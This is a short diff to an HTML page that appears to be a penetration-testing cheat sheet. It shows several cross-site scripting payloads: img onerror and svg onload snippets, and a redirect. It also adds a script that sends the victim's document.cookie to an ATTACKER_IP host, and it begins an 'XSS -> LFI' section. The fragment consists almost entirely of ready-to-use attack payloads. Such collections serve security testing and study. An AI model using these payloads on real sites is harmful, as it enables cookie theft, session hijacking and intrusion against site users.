@@ -621,6 +621,10 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 		    <pre><code>&lt;img src=x onerror=alert()></code></pre>
 		    <pre><code>&lt;img src=x onerror="window.location.href='http://some.site'>"</code></pre>
 		    <pre><code>&lt;svg/onload=confirm("document.cookie")></code></pre>
+		    <pre><code><script>
+    window.location = 'http://&lt;ATTACKER_IP>:&lt;ATTACKER_PORT>/page?param=' + document.cookie;
+</script>
+</code></pre>
 	      <li> XSS -> LFI
 			<pre><code><script>
     x=new XMLHttpRequest;
